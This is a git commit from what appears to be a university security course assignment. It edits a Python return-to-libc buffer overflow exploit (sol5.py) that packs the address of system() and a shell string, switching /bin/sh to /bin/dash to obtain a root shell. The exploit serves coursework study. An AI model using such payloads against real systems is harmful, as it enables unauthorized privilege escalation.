e2980cf51566d62a776098bedf09a65ce168c9b0
hirochri <hirochri@umich.edu>
2017-03-25 15:30:48 -0400

    /bin/sh and /bin/bash didn't give # root prompt, /bin/dash did.. asking on piazza

--- project4/sol5.py
+++ project4/sol5.py
@@ -13,5 +13,5 @@ filler = "D"*22
 ret = pack("<I", 0x0804ef50) #start of system
 dummy_ret = "f"*4
 arg = pack("<I", 0xbffefaa8) #wherever shell code string is
-command = "/bin/sh"
+command = "/bin/dash"
 print filler + ret + dummy_ret + arg + command
